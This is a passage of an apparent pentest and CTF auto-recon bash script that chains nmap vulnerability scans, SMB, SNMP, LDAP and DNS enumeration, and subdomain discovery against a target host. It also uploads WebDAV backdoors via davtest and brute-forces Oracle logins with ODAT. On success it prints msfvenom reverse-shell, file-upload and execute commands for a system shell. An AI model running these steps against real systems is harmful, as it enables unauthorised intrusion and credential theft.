                davtest -move -sendbd auto -url https://$rhost:$port/ | tee -a davtestscan-$rhost-$port.log
            elif grep -i "magento" whatweb-ssl-$rhost-$port.log 2>/dev/null; then
                echo -e "${DOPE} Found Magento! Running /opt/magescan/bin/magescan scan:all --insecure https://$rhost/ | tee magescan-$rhost-$port.log"
                cd /opt/magescan
                bin/magescan scan:all -n --insecure https://$rhost:$port/ | tee magento-$rhost-$port.log
                cd - &>/dev/null
                echo -e "${DOPE} Consider crawling site: python3 /opt/dirsearch/dirsearch.py -u https://$rhost:$port -w /usr/share/seclists/Discovery/Web-Content/CMS/sitemap-magento.txt -e php,asp,aspx,txt,html -t 80 -x 403,401,404,500 --plain-text-report dirsearch-magento-$rhost-$port.log"
            else
                :
            fi
        done
        if [[ -n $redirect_domain ]]; then
            unset rhost
            rhost=${arg[1]}
        elif [[ -n $domainName ]]; then
            unset rhost
            rhost=${arg[1]}
        else
            :
        fi
    fi
}

ftp_scan() {
    grep -w "ftp" top-open-services.txt | cut -d "/" -f 1 >openportsFTP-$rhost.txt
    portfilenameFTP=openportsFTP-$rhost.txt
    # echo $portfilenameSSL
    PortsLinesFTP=$(cat $portfilenameFTP)
    if [[ -s openportsFTP-$rhost.txt ]]; then
        for ftp_port in $PortsLinesFTP; do
            echo -e "${DOPE} Running nmap ftp script scan on port: $ftp_port"
            nmap -sV -Pn -p $ftp_port --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,ftp-syst -v -oA nmap/ftp-enum $rhost
        done
    fi
}

ldap_enum() {
    if [[ $(grep -w "ldap" top-open-services.txt) ]] || [[ $(grep -w "389" top-open-ports.txt) ]]; then
        echo -e "${DOPE} Found LDAP! Running Enum4Linux"
        enum4linux -a -l -v $rhost | tee ldapenum-$rhost.txt
    fi
    if ! grep -q "389" top-open-ports.txt; then
        grep -v "filtered" nmap/udp-$rhost.nmap | grep "open" | cut -d "/" -f 1 >udp-scan2-$rhost.txt
        if grep -q "137" udp-scan2-$rhost.txt; then
            echo -e "${DOPE} Found LDAP UDP port! Running Enum4Linux"
            enum4linux -a -M -l -d $rhost | tee ldapenum-$rhost.txt
            rm udp-scan2-$rhost.txt
        else
            rm udp-scan2-$rhost.txt
        fi
    fi

}

cups_enum() {
    if [[ $(grep -w "ipp" top-open-services.txt) ]] || [[ $(grep -w "631" top-open-ports.txt) ]]; then
        echo -e "${DOPE} Found ipp cups Running nmap command:"
        echo -e "${DOPE} nmap -v -sV -Pn --script=cups-info.nse,cups-queue-info.nse -p 631 -oA nmap/cups-enum-$rhost $rhost"
        nmap -v -sV -Pn --script=cups-info.nse,cups-queue-info.nse -p 631 -oA nmap/cups-enum-$rhost $rhost
    fi
}

nfs_enum() {
    grep -w "rpcbind" top-open-services.txt | cut -d "/" -f 1 >openports-nfs.txt
    if grep -q "111" openports-nfs.txt; then
        echo -e "${DOPE} nmap -v -sV -Pn -p 111 --script=nfs-ls.nse,nfs-statfs.nse,nfs-showmount.nse -oA nmap/nfs-$rhost $rhost"
        nmap -v -sV -Pn -p 111 --script=nfs-ls.nse,nfs-statfs.nse,nfs-showmount.nse -oA nmap/nfs-$rhost $rhost
        showmount -e $rhost 2>&1 | tee nfs-showmount-$rhost.txt
    fi
}

java_rmi_scan() {
    if [[ $(grep -w "rmiregistry" top-open-services.txt) ]] || [[ $(grep -w "1099" top-open-ports.txt) ]]; then
        echo -e "${DOPE} Found Java-Rmi-Registry! Running nmap command:"
        echo -e "${DOPE} nmap -v -sV -Pn --script=rmi-vuln-classloader.nse -p 1099 -oA nmap/java-rmi-$rhost $rhost"
        nmap -v -sV -Pn --script=rmi-vuln-classloader.nse -p 1099 -oA nmap/java-rmi-$rhost $rhost
    fi
    if [[ $(grep -w "java-rmi" top-open-services.txt) ]] || [[ $(grep -w "1100" top-open-ports.txt) ]]; then
        echo -e "${DOPE} Found Java-RMI! Running nmap command:"
        echo -e "${DOPE} nmap -v -sV -Pn --script=rmi-vuln-classloader.nse -p 1099 -oA nmap/java-rmi-$rhost $rhost"
        nmap -v -sV -Pn --script=rmi-dumpregistry.nse -p 1099 -oA nmap/java-rmi-dump-$rhost $rhost
    fi

}

Intense_Nmap_UDP_Scan() {
    printf "\e[93m################### RUNNING NMAP TOP UDP PORTS ##################################################### \e[0m\n"
    echo -e "${DOPE} nmap -sUV -v --reason -T4 --max-retries 3 --max-rtt-timeout 150ms -pU:53,67-69,111,123,135,137-139,161-162,445,500,514,520,631,998,1434,1701,1900,4500,5353,49152,49154 -oA nmap/udp-$rhost $rhost"
    nmap -sUV -v --reason -T4 --max-retries 3 --max-rtt-timeout 150ms -pU:53,67-69,111,123,135,137-139,161-162,445,500,514,520,631,998,1434,1701,1900,4500,5353,49152,49154 -oA nmap/udp-$rhost $rhost
}

Enum_SMB() {
    if [[ $(grep -i "netbios-ssn" top-open-services.txt) ]] || [[ $(grep -i "microsoft-ds" top-open-services.txt) ]]; then
        echo -e "${DOPE} Running SMBCLIENT, Checking shares" | tee -a smb-color-scan-$rhost.log
        echo -e "${DOPE} smbclient -L //$rhost -U 'guest'%" | tee -a smb-color-scan-$rhost.log
        smbclient -L //$rhost -U "guest"% | tee -a smb-color-scan-$rhost.log

        echo -e "${DOPE} Running ENUM4LINUX" | tee -a smb-color-scan-$rhost.log
        echo -e "${DOPE} enum4linux -av $rhost" | tee -a smb-color-scan-$rhost.log
        enum4linux -av $rhost | tee -a smb-color-scan-$rhost.log

        echo -e "${DOPE} Running NMBLOOKUP" | tee -a smb-color-scan-$rhost.log
        echo -e "${DOPE} nmblookup -A $rhost" | tee -a smb-color-scan-$rhost.log
        nmblookup -A $rhost | tee -a smb-color-scan-$rhost.log

        echo -e "${DOPE} Running All SMB nmap Vuln / Enum checks" | tee -a smb-color-scan-$rhost.log
        echo -e "${DOPE} nmap -vv -sV -Pn -p139,445 --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse --script-args=unsafe=1 -oA nmap/smbvulns-$rhost $rhost" | tee -a smb-color-scan-$rhost.log
        nmap -vv -sV -Pn -p139,445 --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse --script-args=unsafe=1 -oA nmap/smbvulns-$rhost $rhost | tee -a smb-color-scan-$rhost.log

        echo -e "${DOPE} Running NBTSCAN" | tee -a smb-color-scan-$rhost.log
        echo -e "${DOPE} nbtscan -rvh $rhost" | tee -a smb-color-scan-$rhost.log
        nbtscan -rvh $rhost | tee -a smb-color-scan-$rhost.log

        echo -e "${DOPE} Running smbmap" | tee -a smb-color-scan-$rhost.log
        echo -e "${DOPE} smbmap -H $rhost" | tee -a smb-color-scan-$rhost.log
        smbmap -H $rhost | tee -a smb-color-scan-$rhost.log
        echo -e "${DOPE} smbmap -u null -p '' -H $rhost" | tee -a smb-color-scan-$rhost.log
        smbmap -u null -p "" -H $rhost | tee -a smb-color-scan-$rhost.log
        echo -e "${DOPE} smbmap -u null -p '' -H $rhost -R" | tee -a smb-color-scan-$rhost.log
        smbmap -u null -p "" -H $rhost -R | tee -a smb-color-scan-$rhost.log

        echo -e "${DOPE} All checks completed Successfully" | tee -a smb-color-scan-$rhost.log
        sed "s,\x1B\[[0-9;]*[a-zA-Z],,g" smb-color-scan-$rhost.log >smb-scan-$rhost.log
        rm smb-color-scan-$rhost.log
    fi
}

Enum_SNMP() {
    cwd=$(pwd)
    # echo $cwd
    cd $cwd
    if grep -q "199" top-open-ports.txt; then
        printf "\e[93m################### RUNNING SNMP-ENUMERATION ##################################################### \e[0m\n"

        echo -e "${DOPE} Running: onesixtyone -c /usr/share/doc/onesixtyone/dict.txt $rhost | tee -a snmpenum-$rhost.log "
        onesixtyone -c /usr/share/doc/onesixtyone/dict.txt $rhost | tee -a snmpenum-$rhost.log
        echo -e "${DOPE} Running: snmp-check -c public -v 1 -d $rhost | tee -a snmpenum-$rhost.log "
        # echo -e "${DOPE} Running: snmp-check -c public -v 2 -d $rhost | tee -a snmpenum-scan.log "
        snmp-check -c public -v 1 -d $rhost | tee -a snmpenum-$rhost.log
        # apt install snmp-mibs-downloader  # then comment out mibs : in /etc/snmp/snmp.conf
        if grep -q "timeout" snmpenum-$rhost.log; then
            echo -e "${DOPE} SNMP version 1 timed-out. Trying version 2. ${DOPE} snmpwalk -c public -v2c $rhost | tee -a snmpenum-$rhost.log"
            snmpwalk -c public -v2c $rhost | tee -a snmpenum-$rhost.log
        else
            :
        fi
    fi
    if ! grep -q "199" top-open-ports.txt; then
        grep -v "filtered" nmap/udp-$rhost.nmap | grep "open" | cut -d "/" -f 1 >udp-scan-$rhost.txt
        if grep -q "161" udp-scan-$rhost.txt; then
            printf "\e[93m################### RUNNING SNMP-ENUMERATION ##################################################### \e[0m\n"

            echo -e "${DOPE} Running: onesixtyone -c /usr/share/doc/onesixtyone/dict.txt $rhost | tee -a snmpenum-$rhost.log "
            onesixtyone -c /usr/share/doc/onesixtyone/dict.txt $rhost | tee -a snmpenum-$rhost.log
            echo -e "${DOPE} Running: snmp-check -c public -v 1 -d $rhost | tee -a snmpenum-$rhost.log "
            # echo -e "${DOPE} Running: snmp-check -c public -v 2 -d $rhost | tee -a snmpenum-scan.log "
            snmp-check -c public -v 1 -d $rhost | tee -a snmpenum-$rhost.log
            # apt install snmp-mibs-downloader  # then comment out mibs : in /etc/snmp/snmp.conf
            if grep -q "timeout" snmpenum-$rhost.log; then
                echo -e "${DOPE} SNMP version 1 timed-out. Trying version 2. ${DOPE} snmpwalk -c public -v2c $rhost | tee -a snmpenum-$rhost.log"
                snmpwalk -c public -v2c $rhost | tee -a snmpenum-$rhost.log
            else
                :
            fi

        fi
    fi

}

FULL_TCP_GOOD_MEASUERE_VULN_SCAN() {
    cwd=$(pwd)
    echo -e "${DOPE} Running Full Nmap TCP port Scan"
    echo -e "${DOPE} nmap -vv -Pn -sC -sV -p- -T4 -oA nmap/full-tcp-scan-$rhost $rhost"
    nmap -vv -Pn -sC -sV -p- -T4 -oA nmap/full-tcp-scan-$rhost $rhost
    echo -e "${YELLOW}#################################################################################################### ${END}"
    echo -e "${TEAL}########################### Checking Vulnerabilities  ############################################## ${END}"
    echo -e "${YELLOW}#################################################################################################### ${END}"
    cd /opt/ReconScan && python3 vulnscan.py $cwd/nmap/full-tcp-scan-$rhost.xml
    cd - &>/dev/null
}

dnsCheckHTB() {
    if grep -q ".htb" nmap/full-tcp-scan-$rhost.nmap; then
        htbdomains=$(grep ".htb" nmap/full-tcp-scan-"$rhost".nmap | sed -e "s/[^/]*\/\/\([^@]*@\)\?\([^:/]*\).*/\2/" | rev | cut -d " " -f 1 | rev | grep "htb" | sort -u)
        for htbdomain in $htbdomains; do
            if [[ -n $htbdomain ]]; then
                if grep -q "$rhost" /etc/hosts; then
                    if grep -q "$htbdomain" /etc/hosts; then
                        echo -e "$htbdomain already in hosts file"
                    else
                        echo -e "adding $htbdomain to hosts file"
                        sed -i $"/$rhost/ s/$/\t$htbdomain/" /etc/hosts
                    fi
                else
                    sed -i $"3i$rhost\t$htbdomain" /etc/hosts
                fi
            fi
        done
    fi
    portfilename=httpports-$rhost.txt
    httpPortsLines2=$(cat $portfilename)
    for port1 in $httpPortsLines2; do
        curl -sSik http://$rhost:$port1 -m 10 -o homepage-source2.html &>/dev/null
        if grep -q ".htb" homepage-source2.html; then
            htbsourcedomains=$(grep '.htb' homepage-source2.html | tr ' ' '\n' | grep ".htb" | sed -e "s/[^/]*\/\/\([^@]*@\)\?\([^:/]*\).*/\2/" | sort -u)
            for htbsourcedomain in $htbsourcedomains; do
                if [[ -n $htbsourcedomain ]]; then
                    if grep -q "$rhost" /etc/hosts; then
                        if grep -q "$htbsourcedomain" /etc/hosts; then
                            echo -e "$htbsourcedomain already in hosts file"
                        else
                            echo -e "adding $htbsourcedomain to hosts file"
                            sed -i $"/$rhost/ s/$/\t$htbsourcedomain/" /etc/hosts
                        fi
                    else
                        sed -i $"3i$rhost\t$htbsourcedomain" /etc/hosts
                    fi
                fi
            done
        fi
        if [[ $rhost == 127.0.0.1 ]]; then
            :
        elif grep -q "$rhost" /etc/hosts; then
            htbdomains3=$(grep $rhost /etc/hosts | awk '{$1= ""; print $0}')
            remwildcardDomains=$(echo $htbdomains3 | tr ' ' '\n')
            for wcDomain in $remwildcardDomains; do
                wildcards=('*' '?' '|')
                for wildcard in "${wildcards[@]}"; do
                    if [[ $wcDomain == *"${wildcard}"* ]]; then
                        :
                    else
                        domainNoWildcard2=$(echo "${wcDomain#'*.'}")
                        echo $domainNoWildcard2 | tee -a htbdomainslist.txt
                    fi
                done
            done
            htbdomains2=$(cat htbdomainslist.txt | sort -u)
            for htbdomain2 in $htbdomains2; do
                dig -x $rhost
                dig axfr @$rhost $htbdomain2
                echo -e "${DOPE} Running: Dnsrecon ${DOPE} dnsrecon -d $htbdomain2"
                dnsrecon -d $htbdomain2 | tee dnsrecon-$rhost-$htbdomain2.log
                echo -e "${DOPE} Running: Sublist3r ${DOPE} python3 sublist3r.py -d $htbdomain2 -o $reconDir/subdomains-$rhost-$htbdomain2.log"
                reconDir=$(echo $cwd)
                cd /opt/Sublist3r && python3 sublist3r.py -d $htbdomain2 -o $reconDir/subdomains-$rhost-$htbdomain2.log
                cd - &>/dev/null
                echo -e "${DOPE} Manual Command to Run: wfuzz ${DOPE} wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1mil-5000.txt -u $htbdomain2 -H "Host: FUZZ.$htbdomain2" "
                # wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1mil-5000.txt -u $htbdomain2 -H "Host: FUZZ.$htbdomain2" --hw 717 --hc 404 -o raw | tee wfuzz-dns-$htbdomain2.txt
                subfinder -d $htbdomain2 -o "$htbdomain2"-subfinder.log
                break
            done
        fi
        if [[ -s htbdomainslist.txt ]]; then
            urldomains=$(cat htbdomainslist.txt)
            for urldomain in $urldomains; do
                echo "http://$urldomain:$port1" | tee -a aquaurls.txt
                echo "https://$urldomain:$port1" | tee -a aquaurls.txt
            done
        fi
    done
    if [[ -s aquaurls.txt ]]; then
        cat aquaurls.txt | sort -u | aquatone -out dns_aquatone
    fi
}

screenshotWEB() {
    cwd=$(pwd)
    if [[ $(grep -E 'http|BaseHTTPServer' top-open-services.txt | grep -v "proxy") ]]; then
        cat dirsearch* | grep -Ev "500|403|400|401|503" | awk '{print $3}' | sort -u >screenshot-URLS.txt
        if [[ -s screenshot-URLS.txt ]]; then
            urlPorts=$(cat openports-web-$rhost.txt | tr '\n' ',')
            formattedUrlPorts=$(echo "${urlPorts::-1}")
            cat screenshot-URLS.txt | aquatone -ports $formattedUrlPorts -out WEBSCREENSHOTS
            rm screenshot-URLS.txt
        fi
    fi
}

screenshotWEBSSL() {
    cwd=$(pwd)
    if [[ $(grep -E 'ssl/http|ssl/unknown|https' top-open-services.txt | grep -v "proxy") ]]; then
        cat gobuster*.txt | grep -Ev "500|403|400|401|503" | awk '{print $1}' | sort -u >screenshot-SSL-URLS.txt
        if [[ -s screenshot-SSL-URLS.txt ]]; then
            mkdir -p ScreenshotsSSL
            urlSSLPorts=$(cat openportsSSL-$rhost.txt | tr '\n' ',')
            formattedSSLUrlPorts=$(echo "${urlSSLPorts::-1}")
            cat screenshot-SSL-URLS.txt | aquatone -ports $formattedSSLUrlPorts -out WEBSSLSCREENSHOTS
            rm screenshot-SSL-URLS.txt
        fi
    fi
}

vulnscan() {
    grep -v "filtered" nmap/full-tcp-scan-$rhost.nmap | grep "open" | grep -i "/tcp" | cut -d "/" -f 1 >allopenports2-$rhost.txt
    # grep -i "/tcp" nmap/full-tcp-scan-$rhost.nmap | grep -w "ssh" | cut -d "/" -f 1 >sshports-$rhost.txt
    if [[ -s allopenports2-$rhost.txt ]]; then
        echo -e "${DOPE} Running nmap VulnScan!"
        echo -e "${DOPE} nmap -v -sV -Pn --script nmap-vulners -p $(tr '\n' , <allopenports2-$rhost.txt) -oA nmap/vulnscan-$rhost $rhost"
        nmap -v -sV -Pn --script nmap-vulners -p $(tr '\n' , <allopenports2-$rhost.txt) -oA nmap/vulnscan-$rhost $rhost

    fi
}

Enum_Oracle() {
    cwd=$(pwd)
    cd $cwd
    reconDir2=$(echo $cwd)
    if grep -q "1521" allopenports2-$rhost.txt; then
        echo -e "${DOPE} Found Oracle! Running NMAP Enumeration "
        echo -e "${DOPE} nmap -sV -p 1521 --script oracle-enum-users.nse,oracle-sid-brute.nse,oracle-tns-version.nse -oA nmap/oracle-$rhost $rhost"
        nmap -sV -p 1521 --script oracle-enum-users.nse,oracle-sid-brute.nse,oracle-tns-version.nse -oA nmap/oracle-$rhost $rhost
        echo -e "${DOPE} tnscmd10g ping -h $rhost -p 1521 | tee oracle-$rhost.log"
        tnscmd10g ping -h $rhost -p 1521 | tee oracle-$rhost.log
        echo -e "${DOPE} tnscmd10g version -h $rhost -p 1521 | tee oracle-$rhost.log"
        tnscmd10g version -h $rhost -p 1521 | tee oracle-$rhost.log
        echo -e "${DOPE} oscanner -v -s $rhost -P 1521 | tee oracle-$rhost.log"
        oscanner -v -s $rhost -P 1521 | tee oracle-$rhost.log
        echo -e "${DOPE} Running ODAT Enumeration"
        cd /opt/odat
        echo -e "${DOPE} ./odat.py tnscmd -s $rhost -p 1521 --ping | tee $reconDir2/oracle-ping.txt"
        ./odat.py tnscmd -s $rhost -p 1521 --ping | tee $reconDir2/oracle-ping.txt
        echo -e "${DOPE} ./odat.py tnscmd -s $rhost -p 1521 --version | tee $reconDir2/oracle-version.txt"
        ./odat.py tnscmd -s $rhost -p 1521 --version | tee $reconDir2/oracle-version.txt
        echo -e "${DOPE} ./odat.py tnscmd -s $rhost -p 1521 --status | tee $reconDir2/oracle-status.txt"
        ./odat.py tnscmd -s $rhost -p 1521 --status | tee $reconDir2/oracle-status.txt
        echo -e "${DOPE} ./odat.py sidguesser -s $rhost -p 1521 | tee $reconDir2/oracle-sid.txt"
        ./odat.py sidguesser -s $rhost -p 1521 | tee $reconDir2/oracle-sid.txt
        SIDS=$(sed -n -e 's/^.*server: //p' $reconDir2/oracle-sid.txt)
        sid_list=$(echo $SIDS | tr "," "\n")
        cp /usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt $reconDir2/oracle_default_userpass.txt
        cp /opt/odat/accounts/accounts_multiple.txt $reconDir2/accounts_multiple.txt
        sed 's/ /\//g' $reconDir2/oracle_default_userpass.txt -i
        sed -e 's/\(.*\)/\L\1/' $reconDir2/accounts_multiple.txt >$reconDir2/accounts_multiple_lowercase.txt
        rm $reconDir2/accounts_multiple.txt
        if [[ -n $SIDS ]]; then
            for sid in $sid_list; do
                echo -e "${DOPE} Running ODAT passwordguesser ${DOPE} ./odat.py passwordguesser -s $rhost -p 1521 -d $sid --accounts-file $reconDir2/oracle_default_userpass.txt --force-retry | tee $reconDir2/oracle-$sid-password-guesser.txt"
                ./odat.py passwordguesser -s $rhost -p 1521 -d $sid --accounts-file $reconDir2/oracle_default_userpass.txt --force-retry | tee $reconDir2/oracle-$sid-password-guesser.txt
                if grep -i "Valid credentials found" $reconDir2/oracle-$sid-password-guesser.txt 2>/dev/null; then
                    echo -e "${DOPE} ${DOPE} ${DOPE} ${DOPE} ${DOPE} ${DOPE} Found Valid Credentials! ${DOPE} ${DOPE} ${DOPE} ${DOPE} ${DOPE} ${DOPE}"
                    cp $reconDir2/oracle-$sid-password-guesser.txt $reconDir2/Found-Oracle-$sid-Credentials.txt
                    grep -v "Time" $reconDir2/Found-Oracle-$sid-Credentials.txt >$reconDir2/oracle-Found-Credentials.txt
                    rm $reconDir2/Found-Oracle-$sid-Credentials.txt
                    grep -A 1 "Accounts found" $reconDir2/oracle-Found-Credentials.txt | tail -n 1 >oracle-user-pass.txt
                    username=$(cat oracle-user-pass.txt | cut -d "/" -f 1)
                    password=$(cat oracle-user-pass.txt | cut -d "/" -f 2)
                    echo -e "${DOPE} You can now get a system shell using MSFVENOM & ODAT!"
                    echo -e "${DOPE} Run the following commands"
                    echo -e "${DOPE} msfvenom -p windows/x64/shell/reverse_tcp LHOST=YOUR-IP LPORT=443 -f exe -o reverse443.exe"
                    echo -e "${DOPE} Start up a metasploit multi handler listener"
                    echo -e "${DOPE} ./odat.py utlfile -s $rhost --sysdba -d $sid -U $username -P $password --putFile /temp Shell.exe reverse443.exe"
                    echo -e "${DOPE} ./odat.py externaltable -s $rhost -U $username -P $password -d $sid --sysdba --exec /temp Shell.exe"
                    :
                else
                    echo -e "${DOPE} Running ODAT passwordguesser ${DOPE} ./odat.py passwordguesser -s $rhost -p 1521 -d $sid --accounts-file $reconDir2/accounts_multiple_lowercase.txt --force-retry | tee $reconDir2/oracle-$sid-2-password-guesser.txt"
                    ./odat.py passwordguesser -s $rhost -p 1521 -d $sid --accounts-file $reconDir2/accounts_multiple_lowercase.txt --force-retry | tee $reconDir2/oracle-$sid-2-password-guesser.txt
                fi
                grep -v "Time" $reconDir2/oracle-sid.txt >$reconDir2/oracle-SID.txt
                rm $reconDir2/oracle-sid.txt
                if [[ -s $reconDir2/oracle-$sid-2-password-guesser.txt ]]; then
                    grep -v "Time" $reconDir2/oracle-$sid-2-password-guesser.txt >$reconDir2/oracle-$sid-1-password-guesser.txt
                    rm $reconDir2/oracle-$sid-2-password-guesser.txt
                fi
                if [[ -s $reconDir2/oracle-$sid-password-guesser.txt ]]; then
                    grep -v "Time" $reconDir2/oracle-$sid-password-guesser.txt >$reconDir2/oracle-$sid-password-guesser3.txt
                    rm $reconDir2/oracle-$sid-password-guesser.txt
                fi
            done
        fi
        cd - &>/dev/null
    else
        :
    fi
}

Clean_Up() {
    # sleep 1
    cwd=$(pwd)
    cd $cwd
    rm udp-scan-$rhost.txt 2>/dev/null
    rm openports-nfs.txt 2>/dev/null
    rm openportsFTP-$rhost.txt 2>/dev/null
    rm openportsSSL-$rhost.txt 2>/dev/null
    rm openports-web-$rhost.txt 2>/dev/null
    rm allopenports2-$rhost.txt 2>/dev/null
    find $cwd/ -maxdepth 1 -name '*-list.*' -exec mv {} $cwd/wordlists \;
    if [ -d $rhost-report ]; then
        find $cwd/ -maxdepth 1 -name "*$rhost*.txt" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -type d -name "wordlists" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name "oracle_default_userpass.txt" -exec mv {} $cwd/$rhost-report/wordlists/ \;
        find $cwd/ -maxdepth 1 -name "accounts_multiple_lowercase.txt" -exec mv {} $cwd/$rhost-report/wordlists/ \;
        find $cwd/ -maxdepth 1 -name "oracle*.*" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name "*.html" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name "wafw00f*.log" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name "wpBrute.sh" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name 'dirsearch*.*' -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name 'whatweb*.log' -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name 'snmpenum*.log' -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name 'wpscan*.log' -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name 'wordpress*.log' -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name 'wp-users.txt' -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name 'top-*.txt' -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name 'top-*.txt' -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name "sslscan-$rhost-$port.log" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name "domain.txt" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name "etc-hosts-backup2.txt" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name "smb-scan-$rhost.log" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name "*$rhost*.log" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name "gobuster*.txt" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name "nikto*.txt" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name "robots*.txt" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name "urls.txt" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name "links.txt" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name "homepage-source.html" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name "*.log" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name "gowitness.db" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name "aquaurls.txt" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -type d -name "dns_aquatone" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -type d -name "WEBSCREENSHOTS" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -type d -name "WEBSSLSCREENSHOTS" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -type d -name "eyewitness-report-$rhost-*" -exec mv {} $cwd/$rhost-report/ \;

    else
        mkdir -p $rhost-report
        find $cwd/ -maxdepth 1 -name "*$rhost*.txt" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -type d -name "wordlists" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name "oracle_default_userpass.txt" -exec mv {} $cwd/$rhost-report/wordlists/ \;
        find $cwd/ -maxdepth 1 -name "accounts_multiple_lowercase.txt" -exec mv {} $cwd/$rhost-report/wordlists/ \;
        find $cwd/ -maxdepth 1 -name "oracle*.*" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name "*.html" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name "wafw00f*.log" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name "wpBrute.sh" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name 'dirsearch*.*' -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name 'whatweb*.log' -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name 'snmpenum*.log' -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name 'wpscan*.log' -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name 'wordpress*.log' -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name 'wp-users.txt' -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name 'top-*.txt' -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name 'top-*.txt' -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name "sslscan-$rhost-$port.log" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name "domain.txt" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name "etc-hosts-backup2.txt" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name "smb-scan-$rhost.log" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name "*$rhost*.log" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name "gobuster*.txt" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name "nikto*.txt" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name "robots*.txt" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name "urls.txt" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name "links.txt" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name "homepage-source.html" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name "*.log" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name "gowitness.db" -exec mv {} $cwd/$rhost-report/ \;
